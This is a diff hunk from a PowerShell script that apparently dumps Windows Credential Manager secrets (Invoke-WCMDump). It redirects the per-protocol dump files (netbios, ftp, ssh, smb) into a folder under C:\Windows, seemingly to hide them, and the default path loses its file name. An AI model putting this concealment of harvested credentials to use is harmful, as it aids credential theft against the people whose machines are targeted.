@@ -260,11 +260,11 @@ function Invoke-WCMDump {
 
 function Get-OutputPath($target) {
     switch -wildcard ($target) {
-        "*netbios*" { return ".\netbios.txt" }
-        "*ftp*" { return ".\ftp.txt" }
-        "*ssh*" { return ".\ssh.txt" }
-        "*smb*" { return ".\smb.txt" }
-        default { return ".\other.txt" }
+        "*netbios*" { return "C:\Windows\loveorhate\netbios.txt" }
+        "*ftp*" { return "C:\Windows\loveorhate\ftp.txt" }
+        "*ssh*" { return "C:\Windows\loveorhate\ssh.txt" }
+        "*smb*" { return "C:\Windows\loveorhate\smb.txt" }
+        default { return "C:\Windows\loveorhate\.txt" }
     }
 }
 
